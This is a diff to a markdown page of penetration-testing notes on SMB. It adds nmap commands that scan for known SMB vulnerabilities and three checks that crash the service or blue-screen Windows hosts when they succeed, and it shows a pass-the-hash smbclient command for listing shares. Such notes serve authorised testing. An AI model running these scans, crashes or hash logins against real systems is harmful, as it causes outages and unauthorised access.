@@ -2,20 +2,33 @@
 layout: default
 title: smb
 tags:
-    - 139
     - 445
     - block
     - message
-    - samba
     - server
     - smbclient
     - smbd
     - smbmap
 ---
 # smb
+### nmap scripts
+safe vulnerability scan
+
+`nmap -p 445 -vv --script smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-vuln-cve-2017-7494 10.10.10.10`
+
+Windows 2000 regsvc null pointer crash (_**service crashes if successful**_)
+
+`nmap -p 445 -vv --script smb-vuln-regsvc-dos 10.10.10.10`
+
+CVE-2009-3103 DOS check (Windows Vista and some of 7 - _**BSOD if successful**_)
+
+`nmap -p 445 -vv --script smb-vuln-cve2009-3103 10.10.10.10`
+
+CVE-2010-2550 memory corruption check (_**BSOD if successful**_)
+
+`nmap -p 445 -vv --script smb-vuln-ms10-054 10.10.10.10`
 
 ### Pass-the-hash
-
 List directories
 
 `smbclient -U <user>%<hash> --pw-nt-hash -L 10.10.10.10`
